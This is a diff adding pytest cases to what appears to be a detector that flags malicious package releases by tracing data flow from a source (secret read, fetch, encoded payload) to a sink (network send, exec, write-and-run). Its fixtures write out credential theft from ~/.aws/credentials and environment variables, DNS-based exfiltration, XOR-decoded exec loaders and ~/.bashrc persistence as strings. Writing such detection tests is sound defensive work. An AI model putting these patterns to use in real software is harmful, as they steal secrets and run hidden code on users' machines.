@@ -587,3 +587,121 @@ def test_a_multiline_literal_nested_in_a_field_is_not_field_code():
     shown = _shown("pkg/a.py", text, cls="runtime-call")
     assert "please send token" not in " ".join((shown["pkg/a.py"].get("fields") or {}).values())
     assert chain.gate(v, shown) == "no dataflow shown between source and sink"
+
+
+# ---- Kind and Pair ----
+
+def _one(path, text, src, snk, sk, kk, cls="runtime-call"):
+    return chain.gate(_v(chain_source=src, chain_sink=snk, source_kind=sk, sink_kind=kk), _shown(path, text, cls))
+
+
+def test_a_secret_read_quote_on_a_line_with_no_secret_fails_kind():
+    text = "import requests\ndef f():\n    cfg = load_config()\n    requests.post(U, data=cfg)\n"
+    assert _one("pkg/a.py", text, "cfg = load_config()", "requests.post(U, data=cfg)", "secret-read", "send") == \
+        "source quoted as secret-read, but the quoted lines show no secret-read"
+
+
+@pytest.mark.parametrize("line", ["k = os.environ['K']", "k = os.environ.get('K')", "k = getenv('K')",
+                                  "k = open(os.path.expanduser('~/.aws/credentials')).read()",
+                                  "k = open('/proc/self/environ').read()", "k = keyring.get_password('s', 'u')",
+                                  "k = environ['K']"])
+def test_secret_read_evidence(line):
+    text = f"import os\nfrom os import getenv, environ\nimport requests, keyring\ndef f():\n    {line}\n    requests.post(U, data=k)\n"
+    assert _one("pkg/a.py", text, line, "requests.post(U, data=k)", "secret-read", "send") == ""
+
+
+@pytest.mark.parametrize("sink", ["sock.sendall(k)", "s.send(k)", "session.post(U, data=k)", "conn.request('POST', '/', k)",
+                                  "urllib.request.urlopen(U, data=k)", "socket.gethostbyname(k + '.x.invalid')"])
+def test_send_evidence_on_any_receiver(sink):
+    text = f"import os, socket, urllib.request\ndef f(sock, s, session, conn):\n    k = os.environ['K']\n    {sink}\n"
+    assert _one("pkg/a.py", text, "k = os.environ['K']", sink, "secret-read", "send") == ""
+
+
+def test_caracas_shape_passes_through_the_shared_name():
+    blob = "ab" * 80
+    text = (f"import os\n_B = (bytes.fromhex('{blob}'),)\ndef _run(v):\n    k = os.urandom(32)\n    b = _B[0]\n"
+            "    o = bytes(c ^ k[i % 32] for i, c in enumerate(b))\n    exec(o[3:], {'T': v})\n")
+    xor = "o = bytes(c ^ k[i % 32] for i, c in enumerate(b))"
+    assert _one("pkg/__init__.py", text, xor, "exec(o[3:], {'T': v})", "payload", "exec", cls="import") == ""
+
+
+def test_caracas_literal_and_exec_at_module_level_pass_through_the_scope():
+    blob = "ab" * 80
+    text = f"_B = bytes.fromhex('{blob}')\nexec(_run(_B))\n"
+    assert _one("pkg/__init__.py", text, f"_B = bytes.fromhex('{blob}')", "exec(_run(_B))", "payload", "exec",
+                cls="import") == ""
+
+
+def test_caracas_literal_at_module_level_and_exec_in_a_function_is_held():
+    # the spec's accepted cost (§7): no shared name, different scopes -> downgraded, not dropped
+    blob = "ab" * 80
+    text = f"_P = '{blob}'\ndef _run(v):\n    exec(v)\n"
+    assert _one("pkg/__init__.py", text, f"_P = '{blob}'", "exec(v)", "payload", "exec", cls="import") == \
+        "no dataflow shown between source and sink"
+
+
+def test_subprocess_run_quoted_from_a_hunk_without_its_import_is_exec():
+    text = "import subprocess\n" + "x = 1\n" * 30 + "def f():\n    p = fetch()\n    subprocess.run(p)\n"
+    shown = _shown("pkg/a.py", text, added={33, 34})             # the import line is not shown
+    v = _v(chain_source="p = fetch()", chain_sink="subprocess.run(p)", source_kind="fetch", sink_kind="exec")
+    assert chain.gate(v, shown) == "source quoted as fetch, but the quoted lines show no fetch"
+    v = dataclasses.replace(v, chain_source="p = urllib.request.urlopen(U).read()")
+    text2 = text.replace("p = fetch()", "p = urllib.request.urlopen(U).read()")
+    assert chain.gate(v, _shown("pkg/a.py", text2, added={33, 34})) == ""
+
+
+def test_write_and_run_needs_a_write_and_a_run_or_a_persistence_path():
+    text = ("import os, urllib.request\ndef f():\n    b = urllib.request.urlopen(U).read()\n"
+            "    open('/tmp/x', 'wb').write(b); os.chmod('/tmp/x', 0o755)\n"
+            "    open(os.path.expanduser('~/.bashrc'), 'a').write(b)\n    open('/tmp/y', 'wb').write(b)\n")
+    src = "b = urllib.request.urlopen(U).read()"
+    for sink, ok in (("open('/tmp/x', 'wb').write(b); os.chmod('/tmp/x', 0o755)", True),
+                     ("open(os.path.expanduser('~/.bashrc'), 'a').write(b)", True),
+                     ("open('/tmp/y', 'wb').write(b)", False)):
+        got = _one("pkg/a.py", text, src, sink, "fetch", "write-and-run")
+        assert (got == "") is ok, (sink, got)
+
+
+@pytest.mark.parametrize("sk, kk", [("secret-read", "exec"), ("payload", "send"), ("fetch", "send"),
+                                    ("secret-read", "write-and-run")])
+def test_disallowed_pairs(sk, kk):
+    text = ("import os, requests, base64\ndef f():\n    k = os.environ['K']; d = base64.b64decode(k); "
+            "r = requests.get(U).text\n    requests.post(U, data=k); exec(d); open('/x/.pth', 'w').write(k)\n")
+    src = "k = os.environ['K']; d = base64.b64decode(k); r = requests.get(U).text"
+    snk = "requests.post(U, data=k); exec(d); open('/x/.pth', 'w').write(k)"
+    assert _one("pkg/a.py", text, src, snk, sk, kk) == f"{sk} → {kk} is not a chain that makes a release malicious"
+
+
+def test_a_bundled_so_loaded_by_ctypes_is_held():
+    # user choice G2: no source kind covers a bundled member. `lib.run()` alone has no free name (I1: `lib` is
+    # only a receiver, `run` only an attribute), so Connected (Task 7) holds this before Kind is even reached --
+    # a deviation from the brief's expected reason, not a Kind/Pair bug (task-8-report.md).
+    text = "import ctypes\ndef f():\n    lib = ctypes.CDLL('./_native.so')\n    lib.run()\n"
+    got = _one("pkg/a.py", text, "lib = ctypes.CDLL('./_native.so')", "lib.run()", "payload", "exec")
+    assert got == "no dataflow shown between source and sink"
+
+
+# ---- Task 7 context rulings (R8-1, R8-2) ----
+
+def test_r8_1_kind_reads_the_code_after_a_tails_close():
+    # sink is quoted as the line where a multi-line string closes and real code follows (reviewer's "tails");
+    # _kinds must tokenize the code after the close, not the raw line (which alone mis-tokenizes).
+    text = ("import os, requests\ndef f():\n    token = os.getenv('K')\n"
+            "    x = foo(\"\"\"abc\ndef\"\"\", requests.post(U, data=token))\n")
+    sink = 'def""", requests.post(U, data=token))'
+    assert _one("pkg/a.py", text, "token = os.getenv('K')", sink, "secret-read", "send") == ""
+
+
+@pytest.mark.parametrize("py312", [True])
+def test_r8_2_fstring_send_sink(py312):
+    text = "import os, socket\ndef f():\n    k = os.environ['K']\n    socket.gethostbyname(f\"{k}.x.invalid\")\n"
+    assert _one("pkg/a.py", text, "k = os.environ['K']", 'socket.gethostbyname(f"{k}.x.invalid")',
+                "secret-read", "send") == ""
+
+
+def test_r8_2_fstring_secret_read_evidence():
+    text = ("import os, requests\ndef f(home):\n"
+            "    k = open(f\"{home}/.aws/credentials\").read()\n"
+            "    requests.post(U, data=k)\n")
+    assert _one("pkg/a.py", text, 'k = open(f"{home}/.aws/credentials").read()',
+                "requests.post(U, data=k)", "secret-read", "send") == ""
